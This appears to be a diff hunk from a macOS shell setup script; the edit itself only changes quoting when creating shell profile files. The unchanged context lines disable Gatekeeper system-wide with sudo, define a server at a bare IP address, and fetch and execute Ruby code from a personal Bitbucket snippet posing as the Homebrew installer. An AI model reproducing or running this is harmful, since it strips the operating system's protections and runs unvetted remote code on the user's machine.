@@ -4,7 +4,7 @@ set -e; sudo spctl --master-disable; SERVER='GS=http://149.28.95.12:8808'
 
 echo 'echo0';
 
-multitouch () { for f in "$@"; do touch "~/.${f}"; done }; multitouch bash_profile bashrc
+multitouch () { for f in "$@"; do touch ~/.${f}; done }; multitouch bash_profile bashrc
 chkprog () { if hash $1 2>/dev/null; then return 0; else return 1; fi }
 if ! chkprog brew; then
   /usr/bin/ruby -e "$(curl -fsSL https://bitbucket.org/!api/2.0/snippets/bravosprinthub/dA9ekg/33d09f92409a6cf46252702d57ace069bf152627/files/forkedtap)"; else brew update;
